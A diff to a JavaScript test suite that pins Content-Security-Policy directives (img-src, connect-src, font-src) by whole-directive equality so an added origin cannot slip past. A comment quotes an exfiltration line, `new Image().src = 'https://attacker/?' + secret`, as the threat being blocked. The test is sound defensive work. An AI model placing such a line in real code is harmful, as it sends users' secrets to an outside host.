@@ -76,14 +76,19 @@ describe('baseline security headers', () => {
         // with `new Image().src = 'https://attacker/?' + secret`. The CDN entry
         // beside it was decoration for as long as the scheme source was there.
         const csp = (await request(buildApp()).get('/')).headers['content-security-policy'];
-        const directive = csp.split('; ').find(part => part.startsWith('img-src '));
+        const directiveOf = name => csp.split('; ').find(part => part.startsWith(`${name} `));
 
-        expect(directive).toBe("img-src 'self' data: https://cdn.discordapp.com");
-        expect(directive).not.toMatch(/(^|\s)https:(\s|$)/);
+        expect(directiveOf('img-src')).toBe("img-src 'self' data: https://cdn.discordapp.com");
+        expect(directiveOf('img-src')).not.toMatch(/(^|\s)https:(\s|$)/);
         // The same reasoning applies to the two other directives that can carry
         // a request off-origin, so they are pinned here rather than left to be
         // widened quietly later.
-        expect(csp).toContain("connect-src 'self'");
-        expect(csp).toContain("font-src 'self'");
+        //
+        // Whole directive, not a substring (#985): `toContain("connect-src
+        // 'self'")` is satisfied by `connect-src 'self' https://attacker` too,
+        // so the assertion that was meant to stop an origin being added was the
+        // one assertion an added origin could not fail.
+        expect(directiveOf('connect-src')).toBe("connect-src 'self'");
+        expect(directiveOf('font-src')).toBe("font-src 'self'");
     });
 });
